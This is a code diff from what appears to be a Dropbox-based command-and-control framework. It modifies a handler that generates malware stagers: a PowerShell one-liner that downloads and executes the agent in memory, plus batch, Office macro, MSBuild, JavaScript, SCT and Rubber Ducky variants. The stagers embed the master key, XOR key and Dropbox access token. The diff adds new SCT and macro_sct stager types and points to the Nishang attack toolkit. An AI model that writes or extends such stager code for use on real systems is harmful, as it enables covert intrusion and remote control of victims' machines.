@@ -123,27 +123,35 @@ class MainHandler:
 		# These are the common parameters required by the various stager (powershell or other) script
 		stagerParameters = { 'stagePublicURL': self.statusHandler.publishedStageList[stageName], 'xorKey': Crypto.convertKey(self.statusHandler.masterKey, outputFormat = "sha256"), 'masterKey': helpers.b64encode(self.statusHandler.masterKey), 'accessToken': self.dropboxHandler.token }
 		
-		genStager = stagers.GenStager(stagerParameters)
-
-		# Generate a powershell one liner stager that downloads and execute the agent stage (exe) in memory
 		if stagerType == "oneliner":
 			print
-			print helpers.color(genStager.oneLiner(), 'green')
+			print helpers.color(stagers.GenStager.oneLiner(stagerParameters), 'green')
 			print
 			print helpers.color("[*] HINT: You can use this powershell oneliner as is, or with one of the fantastic 'Nishang' client side attack vector generator")
 			return
 		elif stagerType == "batch":
-			genStager.batch()
+			stagers.GenStager.batch(stagerParameters)
 			return
 		elif stagerType == "macro":
-			genStager.macro()
+			stagers.GenStager.macro(stagerParameters)
 			return
 		elif stagerType == "msbuild":
-			genStager.msbuild()
+			stagers.GenStager.msbuild(stagerParameters)
 			return
 		elif stagerType == "javascript":
-			genStager.javascript()
+			stagers.GenStager.javascript(stagerParameters)
 			return
 		elif stagerType == "ducky":
-			genStager.ducky()
+			stagers.GenStager.ducky(stagerParameters)
+			return
+		elif stagerType == "sct":
+			stagers.GenStager.sct(stagerParameters)
+			return
+
+	#------------------------------------------------------------------------------------
+	def genStager2(self, stagerType, arguments):
+
+		# Generate a powershell one liner stager that downloads and execute the agent stage (exe) in memory
+		if stagerType == "macro_sct":
+			stagers.GenStager.macro_sct(arguments)
 			return
